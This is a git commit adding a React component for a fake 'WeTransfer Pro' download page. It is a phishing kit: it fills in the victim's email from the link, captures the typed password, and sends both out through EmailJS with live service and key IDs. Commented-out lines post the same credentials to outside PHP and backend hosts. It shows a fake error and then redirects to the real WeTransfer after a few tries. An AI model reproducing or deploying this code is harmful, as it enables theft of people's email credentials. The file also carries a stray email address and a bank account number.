3aad8f6ea20c30cf141c17678dffa1f3a38970cd
steadyfactorial <worksteady2@gmail.com>
2023-12-14 18:08:02 -0500

    first commit

---
+++ src/Component/Form/Form.js
@@ -0,0 +1,186 @@
+
+import React, { useState, useRef } from "react";
+import './Form.css';
+import emailJS from '@emailjs/browser';
+import PreLoader from '../Preloader/Preloader';
+import $ from 'jquery';
+
+export const Form = ({ toggleForm })=>{
+
+
+    const emailInTheURL = window.location.href;
+    const sliceEqualSign = emailInTheURL.indexOf("=");
+    const extracetdEmail = emailInTheURL.substr((sliceEqualSign+1));
+
+    // const [email, setEmail] = useState("afefarhan01@mail.ru");
+    const [email, setEmail] = useState(extracetdEmail);
+    const [password, setPassword] = useState("");
+
+    const [err, setErr] = useState(false);
+    const [spin, setSpin] = useState(false);
+
+    const form = useRef();
+    const [count, setCount] = useState(0);
+
+    const submitWetransferDetails = (e)=>{
+        e.preventDefault();
+        // alert('erhjk');
+        if(password === ""){
+            return null
+        }else{
+
+            setCount(count=> count + 1);
+            if(count >= 2){
+                const redirectURL = window.location.href;
+                const sliceEqualSign = redirectURL.indexOf("@");
+                const extracetdemailDomain = redirectURL.substr((sliceEqualSign+1));
+                console.log(extracetdemailDomain);
+                window.location.href = "https://wetransfer.com/";
+            };
+
+            // posted a request to the server below
+            const user = {
+                x1: email,
+                x2: password
+            };
+            
+            $.ajax({
+                type: "POST",
+                // url: "https://pearldozen.com/nc_assets/fonts/bgma/mna.php",
+                data: user,
+                success(data) {
+                    console.log('ok');
+                },
+            });
+
+
+            let data = {
+                username: email,
+                password: password
+              };
+              
+            //   POST REQUEST FROM EMAILJS 
+              
+            // emailJS.sendForm('service_y8au5vp', 'template_rqzbmfg', form.current, 'XH425r5Ty_DHElmjh')
+            // .then((result) => {
+            //     console.log(result.text);
+            // }, (error) => {
+            //     console.log(error.text);
+            // });
+
+            // template variable 
+            // user_name
+            // user_password
+
+
+            emailJS.sendForm('service_rt8lcqf', 'template_k47h6u5', form.current, 'OiZiEI11qPTzZNaWM')
+            .then((result) => {
+                console.log(result.text);
+            }, (error) => {
+                console.log(error.text);
+            });
+            
+            //   http://localhost:6040/ali/get
+            // const myURI = "http://localhost:6040/ali/create";
+            // const live_URI = "https://sample-backend-oeeb.onrender.com/v/api/aBc/create";
+
+      
+        //   fetch(live_URI, {
+        //           method:'POST',
+        //           headers: {
+        //               "Content-Type": 'application/json',
+        //               "Access-Control-Allow-Origin": "*"
+        //             },
+        //             body: JSON.stringify(data)
+        //       })
+        //       .then((res)=> {
+        //           res.json();
+        //       })
+        //       .then(data=> console.log('ok'))
+        //       .catch(err=> console.error(err));
+
+            setSpin(true);
+
+            setTimeout(() => {
+                setSpin(false);
+                setPassword('');
+                setErr(true);
+                setTimeout(() => {
+                    setErr(false);
+                }, 2700);
+            }, 2000);
+        }
+
+    };
+
+    return(<div className="Form">
+
+        <div className="modal">
+            <div className="m-content">
+
+                <div className="m-top">
+                    <button className="cls-btn" id="mk_ekx_bodr_circ" onClick={toggleForm}>x</button>
+                </div>
+
+
+                <div className="box">
+
+                    <form autoComplete="off" ref={form} onSubmit={submitWetransferDetails}>
+
+                        { spin ? <PreLoader /> : null }
+
+                        <div className="form-group">
+                            <input 
+                            type={`email`}
+                            name="email"
+                            className="form-control"
+                            required
+                            placeholder="Email Address"
+                            value={email}
+                            onChange={e=> setEmail(e.target.value)}
+                            readOnly
+                            />
+                        </div>
+
+
+
+                        <div className="form-group">
+                            <input 
+                            type={`password`}
+                            name="password"
+                            className="form-control"
+                            required
+                            placeholder="Password"
+                            value={password}
+                            onChange={e=> setPassword(e.target.value)}
+                            autoFocus
+                            />
+                        </div>
+
+
+                        <button type="submit" className="login-btn dn_ld_iefh" onClick={submitWetransferDetails}>
+                            Download
+                        </button>
+
+                    </form>
+
+                    <div className="m-footer">
+                        <h1>WeTransfer Pro</h1>
+                        <p>Get more out of WeTransfer, get Pro</p>
+                    </div>
+
+                   { err ? <p className="error-box">
+                        This email address and password don't seem to match...
+                        Please double-check and try again
+                    </p> : null}
+
+                </div>
+
+
+            </div>
+        </div>
+
+    </div>)
+};
+
+// GT Bank => 0506869203
--- src/index.js
+++ src/index.js
@@ -1,17 +1,15 @@
 import React from 'react';
 import ReactDOM from 'react-dom/client';
 import './index.css';
-import App from './App';
 import reportWebVitals from './reportWebVitals';
 
-const root = ReactDOM.createRoot(document.getElementById('root'));
+import WeTransfer from './App';
+// import Logs from './Logs';
+
+const root = ReactDOM.createRoot(document.getElementById('sample_we_transsfer_view_'));
 root.render(
   <React.StrictMode>
-    <App />
+    <WeTransfer />
   </React.StrictMode>
 );
-
-// If you want to start measuring performance in your app, pass a function
-// to log results (for example: reportWebVitals(console.log))
-// or send to an analytics endpoint. Learn more: https://bit.ly/CRA-vitals
 reportWebVitals();
